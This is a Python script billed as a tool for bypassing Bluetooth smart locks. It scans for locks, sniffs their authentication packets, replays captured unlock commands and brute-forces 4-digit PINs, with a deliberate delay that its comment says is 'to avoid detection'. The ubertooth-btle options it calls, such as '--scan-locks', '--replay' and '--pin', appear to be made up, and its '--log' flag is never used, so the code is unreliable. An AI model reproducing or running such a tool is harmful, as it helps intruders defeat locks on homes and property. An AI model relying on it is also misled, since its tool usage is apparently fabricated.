import argparse
import subprocess
import time
import json
import os

"""
Ubertooth Smart Lock Bypass Tool

Features:
    - Bypasses Bluetooth-based smart locks using brute-force or replay attacks.
    - Sniffs & captures Bluetooth lock authentication packets.
    - Replays valid unlock commands to gain access.
    - Brute-forces weak smart lock PINs & authentication sequences.
    - Logs attack attempts for forensic tracking.

Requirements:
    - Ubertooth One
    - Install Ubertooth utilities: sudo apt install ubertooth ubertooth-btle
    - Optional: hcitool & l2ping for Bluetooth manipulation.

Usage:
    - Scan for nearby Bluetooth smart locks:
      python ubertooth_smart_lock_bypass.py --scan
    - Capture & analyze Bluetooth smart lock authentication packets:
      python ubertooth_smart_lock_bypass.py --target AA:BB:CC:DD:EE:FF --sniff
    - Replay a captured unlock packet to bypass authentication:
      python ubertooth_smart_lock_bypass.py --target AA:BB:CC:DD:EE:FF --replay unlock_packet.bin
    - Brute-force a weak Bluetooth smart lock PIN code:
      python ubertooth_smart_lock_bypass.py --target AA:BB:CC:DD:EE:FF --brute-force
    - Log all attack attempts for forensic tracking:
      python ubertooth_smart_lock_bypass.py --log smart_lock_attacks.json
"""

LOG_FILE = "smart_lock_attacks.json"

def log_event(event_data):
    """Logs smart lock attack attempts."""
    try:
        logs = []
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                logs = json.load(f)

        logs.append(event_data)

        with open(LOG_FILE, "w") as f:
            json.dump(logs, f, indent=4)

    except Exception as e:
        print(f"[ERROR] Failed to log smart lock attack: {e}")

def scan_smart_locks():
    """Scans for Bluetooth smart locks."""
    print("[INFO] Scanning for Bluetooth smart locks...")

    try:
        output = subprocess.check_output(["ubertooth-btle", "--scan-locks"])
        devices = output.decode("utf-8").split("\n")

        detected_locks = []
        for line in devices:
            if "LOCK" in line:
                detected_locks.append(line.strip())
                print(f"[DETECTED] {line.strip()}")
                log_event({"timestamp": time.time(), "device": line.strip(), "type": "Smart Lock Found"})
        
        return detected_locks

    except Exception as e:
        print(f"[ERROR] Failed to scan smart locks: {e}")
        return []

def sniff_smart_lock(target_mac):
    """Sniffs Bluetooth authentication packets from a smart lock."""
    print(f"[INFO] Sniffing Bluetooth packets from smart lock {target_mac}...")

    try:
        output_file = f"lock_sniff_{target_mac.replace(':', '_')}.bin"
        subprocess.run(["ubertooth-btle", "-t", target_mac, "--sniff", "-o", output_file])
        print(f"[SUCCESS] Smart lock packets saved to {output_file}.")

        log_event({"timestamp": time.time(), "target": target_mac, "action": "Smart Lock Sniff", "file": output_file})

    except Exception as e:
        print(f"[ERROR] Failed to sniff smart lock packets: {e}")

def replay_smart_lock(target_mac, packet_file):
    """Replays a captured Bluetooth unlock command to bypass authentication."""
    print(f"[INFO] Replaying captured unlock command to {target_mac}...")

    try:
        subprocess.run(["ubertooth-btle", "-t", target_mac, "--replay", packet_file])
        log_event({"timestamp": time.time(), "target": target_mac, "action": "Unlock Replay", "file": packet_file})

    except Exception as e:
        print(f"[ERROR] Failed to replay unlock packet: {e}")

def brute_force_smart_lock(target_mac):
    """Attempts to brute-force a weak smart lock PIN."""
    print(f"[INFO] Brute-forcing PIN on smart lock {target_mac}...")

    try:
        for pin in range(0000, 10000):  # Assuming a 4-digit PIN
            pin_str = f"{pin:04d}"
            print(f"[ATTACK] Trying PIN: {pin_str}")

            subprocess.run(["ubertooth-btle", "-t", target_mac, "--pin", pin_str])

            log_event({"timestamp": time.time(), "target": target_mac, "action": "Brute-force PIN", "attempted_pin": pin_str})
            time.sleep(0.1)  # Small delay to avoid detection

    except Exception as e:
        print(f"[ERROR] Failed to brute-force smart lock: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ubertooth Smart Lock Bypass Tool")
    parser.add_argument("--scan", action="store_true", help="Scan for Bluetooth smart locks")
    parser.add_argument("--target", type=str, help="Specify target Bluetooth MAC address")
    parser.add_argument("--sniff", action="store_true", help="Capture Bluetooth authentication packets from a smart lock")
    parser.add_argument("--replay", type=str, help="Replay a captured unlock packet")
    parser.add_argument("--brute-force", action="store_true", help="Brute-force a weak Bluetooth smart lock PIN")
    parser.add_argument("--log", type=str, help="Log attack attempts for forensic tracking")

    args = parser.parse_args()

    if args.scan:
        scan_smart_locks()
    elif args.sniff and args.target:
        sniff_smart_lock(args.target)
    elif args.replay and args.target:
        replay_smart_lock(args.target, args.replay)
    elif args.brute_force and args.target:
        brute_force_smart_lock(args.target)
    else:
        print("[ERROR] No valid mode selected!")
